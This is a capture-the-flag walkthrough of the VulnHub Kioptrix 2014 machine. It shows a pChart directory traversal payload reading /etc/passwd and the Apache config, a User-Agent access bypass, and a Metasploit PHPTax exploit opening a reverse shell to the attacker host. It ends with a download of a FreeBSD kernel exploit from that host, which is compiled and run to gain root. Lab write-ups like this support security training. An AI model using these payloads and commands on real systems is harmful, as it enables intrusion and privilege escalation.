# Kioptrix 2014 | VulnHub
https://www.vulnhub.com/entry/kioptrix-2014-5,62/

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -T4 -p- 192.168.34.150
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:12 EDT
Nmap scan report for 192.168.34.150
Host is up (0.00075s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:88:6E:C3 (VMware)
Device type: general purpose
Running: FreeBSD 9.X|10.X
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10
OS details: FreeBSD 9.0-RELEASE - 10.3-RELEASE
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 192.168.34.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.10 seconds
```
The machine is running SSH and Apache on port 80 and 8080. Looks like the OS is FreeBSD as well.

### 2. Enumerate web servers
Checking out port 8080 first, the first page encountered is 403 forbidden. Dirbusting returns nothing but a wave of 403 responses as well. The web server on port 80 hosts a simple message: "It Works!". In the source code there is a commented out link directing to another page which turns out to be an instance of the pChart 2.1.3 PHP web app.
```html
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>

```
This web app has a few disclosed vulnerabilites - one which is going to help really early is a directory traversal bug which allows us to read files on the server. Filenames can be added to the URL, as follows:
```bash
GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

<code><span style="color: #000000">
#&nbsp;$FreeBSD:&nbsp;release/9.0.0/etc/master.passwd&nbsp;218047&nbsp;2011-01-28&nbsp;22:29:38Z&nbsp;pjd&nbsp;$
#
root:*:0:0:Charlie&nbsp;&amp;:/root:/bin/csh
toor:*:0:0:Bourne-again&nbsp;Superuser:/root:
daemon:*:1:1:Owner&nbsp;of&nbsp;many&nbsp;system&nbsp;processes:/root:/usr/sbin/nologin
operator:*:2:5:System&nbsp;&amp;:/:/usr/sbin/nologin
bin:*:3:7:Binaries&nbsp;Commands&nbsp;and&nbsp;Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty&nbsp;Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem&nbsp;Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games&nbsp;pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News&nbsp;Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister&nbsp;Man&nbsp;Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure&nbsp;Shell&nbsp;Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail&nbsp;Submission&nbsp;User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail&nbsp;Default&nbsp;User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind&nbsp;Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet&nbsp;Filter&nbsp;pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd&nbsp;privsep&nbsp;user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp&nbsp;programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP&nbsp;pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post&nbsp;Office&nbsp;Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World&nbsp;Wide&nbsp;Web&nbsp;Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST&nbsp;unprivileged&nbsp;user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged&nbsp;user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL&nbsp;Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User&nbsp;&amp;:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User&nbsp;&amp;:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User&nbsp;&amp;:/usr/local/ossec-hids:/sbin/nologin
</span>
</code>
```
The Apache server configuration file (see apache22.conf):
```bash
GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr%2flocal%2fetc%2fapache22%2fhttpd.conf

<code><span style="color: #000000">
#
# This is the main Apache HTTP server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See  <URL:http://httpd.apache.org/docs/2.2 > for detailed information.
# In particular, see 
...

# Secure (SSL/TLS) connections
#Include etc/apache22/extra/httpd-ssl.conf
#
# Note: The following must must be present to support
#       starting without SSL on platforms with no /dev/random equivalent
#       but a statically compiled-in mod_ssl.
#
 <IfModule ssl_module >
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
 </IfModule >

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

 <VirtualHost *:8080 >
    DocumentRoot /usr/local/www/apache22/data2

 <Directory "/usr/local/www/apache22/data2" >
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
 </Directory >



 </VirtualHost >
 ...
```
Here there is some checking going on for the server on port 8080. If the User-Agent contains Mozilla/4.0 (emulating Internet Explorer), the permissions for the server are relaxed. This is as simple as changing one character in the User-Agent for requests. Once done, access is given for the port 8080 web server, which reveals another web application, PHPTax. Though I can't find a version number, the source code indicates the application was made in 2003.

### 3. Get a shell
There are proof of concepts for RCE using PHPTax, including a Metasploit module that can be used to test it.
```bash
msf5 exploit(multi/http/phptax_exec) > options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.34.150   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.34.142   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8


msf5 exploit(multi/http/phptax_exec) > run

[*] Started reverse TCP double handler on 192.168.34.142:4444 
[*] 192.168.34.1508080 - Sending request...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo JxDzX3LT5EKRcyLN;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Command: echo p4O9QwQUuHEa9no3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "JxDzX3LT5EKRcyLN\r\n"
[*] Matching...
[*] A is input...
[*] Reading from socket B
[*] B: "p4O9QwQUuHEa9no3\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.34.142:4444 -> 192.168.34.150:40297) at 2020-10-29 04:18:47 -0400

whoami
www
/bin/sh -i
sh: can't access tty; job control turned off
$
```

### 4. Enumerate from foothold
This shell has extremely limited permissions, but regardless some enumeration is possible. Firstly checking out the web files:
```bash
$ ls
cgi-bin
data
data2
error
icons
$ ls data
index.html
pChart.tar.gz
pChart2.1.3
$ ls data2
phptax
$ cat cgi-bin/*
#!/usr/local/bin/perl
##
##  printenv -- demo CGI program which just prints its environment
##

print "Content-type: text/plain; charset=iso-8859-1\n\n";
foreach $var (sort(keys(%ENV))) {
    $val = $ENV{$var};
    $val =~ s|\n|\\n|g;
    $val =~ s|"|\\"|g;
    print "${var}=\"${val}\"\n";
}

#!/bin/sh

# disable filename globbing
set -f

echo "Content-type: text/plain; charset=iso-8859-1"
echo

echo CGI/1.0 test script report:
echo

echo argc is $#. argv is "$*".
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = "$PATH_INFO"
echo PATH_TRANSLATED = "$PATH_TRANSLATED"
echo SCRIPT_NAME = "$SCRIPT_NAME"
echo QUERY_STRING = "$QUERY_STRING"
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo AUTH_TYPE = $AUTH_TYPE
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
```
None of this looks particulary interesting. Moving on to getting the right OS version:
```bash
$ uname -mrs
FreeBSD 9.0-RELEASE amd64
```
This is a bit more like it. A running theme of all these Kioptrix boxes are ancient operating systems (no fault of the creator since they were made ages ago). Of course there are kernal exploits for this. If I need to compile, www has access to gcc for some reason?
```bash
$ which gcc
/usr/bin/gcc
$ gcc
gcc: No input files specified
```
So that's great. There is an existing kernal exploit that leverages ptrace to access a vulnerable function in the mmap implementation of the OS, to make system calls which lead to privilege escalation. This is detailed further at https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/ and https://www.exploit-db.com/exploits/26368.

### 5. Escalate to root
Firstly get the C file onto the machine and compile it.
```bash
$ fetch -o mpte.c http://192.168.34.142:8000/mpte.c
mpte.c                                                2213  B 5095 kBps
$ ls
aprkiJD9m
mpte.c
mysql.sock
vmware-fonts0
$ gcc mpte.c -o mpte
mpte.c:89:2: warning: no newline at end of file
```
Then modify the permissions and run it.
```bash
$ chmod +x mpte
$ ./mpte
whoami
root
```